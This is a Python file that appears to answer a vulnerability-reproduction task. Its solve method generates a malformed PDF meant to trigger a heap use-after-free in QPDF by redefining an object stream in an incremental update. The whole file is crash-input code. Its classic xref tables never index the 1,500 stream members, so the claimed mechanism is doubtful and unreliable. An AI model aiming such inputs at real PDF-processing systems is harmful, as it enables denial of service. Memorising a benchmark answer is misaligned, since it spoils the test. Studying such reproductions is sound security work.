import zlib

class Solution:
  def solve(self, src_path: str) -> bytes:
    """
    Generates a PoC PDF that triggers a Heap Use After Free vulnerability.

    The vulnerability occurs when a PDF with an incremental update redefines an
    object stream. QPDF's object cache can mishandle the duplicate object
    definitions, leading to one being freed while a pointer to it is still in
    use.

    This PoC creates a PDF with:
    1. An initial object stream containing many small objects.
    2. An incremental update that redefines this same object stream with
       different content for the contained objects.

    When a vulnerable version of QPDF processes this file (e.g., to rewrite or
    analyze it), it loads both definitions of the object stream. The internal
    logic fails to properly handle the duplicates, freeing the memory for objects
    from the first stream definition. Later access to these objects via a
    dangling pointer leads to a crash.
    """
    content = bytearray()
    offsets = {}

    def add_obj_to_content(obj_num, data, record_offset=True):
      """Helper to add a PDF object to the content bytearray."""
      offset = len(content)
      if record_offset:
        offsets[obj_num] = offset
      
      content.extend(f"{obj_num} 0 obj\n".encode())
      if isinstance(data, str):
        content.extend(data.encode())
      else:
        content.extend(data)
      content.extend(b"\nendobj\n\n")
      return offset

    # 1. PDF Header
    content.extend(b"%PDF-1.7\n")
    content.extend(b"%\xE2\xE3\xCF\xD3\n\n") # Binary comment

    # 2. Basic Document Structure (Catalog, Pages, Page)
    add_obj_to_content(1, "<< /Type /Catalog /Pages 2 0 R >>")
    add_obj_to_content(2, "<< /Type /Pages /Count 1 /Kids [3 0 R] >>")
    add_obj_to_content(3, "<< /Type /Page /Parent 2 0 R >>")

    # 3. First Object Stream
    # A large number of objects increases the likelihood of a crash.
    num_stream_objs = 1500
    obj_stream_id = 4
    first_obj_in_stream = 5
    
    stream_header = ""
    stream_body = bytearray()
    for i in range(num_stream_objs):
      obj_num = first_obj_in_stream + i
      stream_header += f"{obj_num} {len(stream_body)} "
      obj_data = f"<< /MyData_{i} /Val {i} >>".encode()
      stream_body.extend(obj_data)
    
    stream_header_bytes = stream_header.encode()
    stream_content = stream_header_bytes + bytes(stream_body)
    compressed_stream_content = zlib.compress(stream_content)
    
    stream_obj_data = (
        f"<< /Type /ObjStm /N {num_stream_objs} /First {len(stream_header_bytes)} /Filter /FlateDecode /Length {len(compressed_stream_content)} >>\nstream\n".encode() +
        compressed_stream_content +
        b"\nendstream"
    )
    add_obj_to_content(obj_stream_id, stream_obj_data)

    # 4. First XRef Table and Trailer
    xref1_offset = len(content)
    content.extend(b"xref\n")
    num_direct_objs_part1 = obj_stream_id + 1
    content.extend(f"0 {num_direct_objs_part1}\n".encode())
    content.extend(b"0000000000 65535 f \n")
    for i in range(1, num_direct_objs_part1):
      content.extend(f"{offsets[i]:010d} 00000 n \n".encode())
    
    # Trailer /Size must be 1 greater than the highest object number.
    trailer_size = first_obj_in_stream + num_stream_objs
    
    content.extend(b"trailer\n")
    content.extend(f"<< /Size {trailer_size} /Root 1 0 R >>\n".encode())
    content.extend(b"startxref\n")
    content.extend(f"{xref1_offset}\n".encode())
    content.extend(b"%%EOF\n\n")

    # 5. Incremental Update: Redefine the Object Stream
    new_stream_header = ""
    new_stream_body = bytearray()
    for i in range(num_stream_objs):
      obj_num = first_obj_in_stream + i
      new_stream_header += f"{obj_num} {len(new_stream_body)} "
      # Use different keys and values to ensure content is distinct.
      obj_data = f"<< /DifferentData_{i} {i*2} >>".encode()
      new_stream_body.extend(obj_data)

    new_stream_header_bytes = new_stream_header.encode()
    new_stream_content = new_stream_header_bytes + bytes(new_stream_body)
    new_compressed_stream_content = zlib.compress(new_stream_content)

    new_stream_obj_data = (
        f"<< /Type /ObjStm /N {num_stream_objs} /First {len(new_stream_header_bytes)} /Filter /FlateDecode /Length {len(new_compressed_stream_content)} >>\nstream\n".encode() +
        new_compressed_stream_content +
        b"\nendstream"
    )
    redefined_obj_stream_offset = add_obj_to_content(obj_stream_id, new_stream_obj_data, record_offset=False)

    # 6. Second XRef Table and Trailer for the incremental update
    xref2_offset = len(content)
    content.extend(b"xref\n")
    # This xref section only needs to list the changed objects.
    content.extend(b"0 1\n") # Free list head
    content.extend(b"0000000000 65535 f \n")
    content.extend(f"{obj_stream_id} 1\n".encode()) # Redefined object stream
    content.extend(f"{redefined_obj_stream_offset:010d} 00000 n \n".encode())
    
    content.extend(b"trailer\n")
    # The new trailer points to the previous one.
    content.extend(f"<< /Size {trailer_size} /Root 1 0 R /Prev {xref1_offset} >>\n".encode())
    content.extend(b"startxref\n")
    content.extend(f"{xref2_offset}\n".encode())
    content.extend(b"%%EOF\n")
    
    return bytes(content)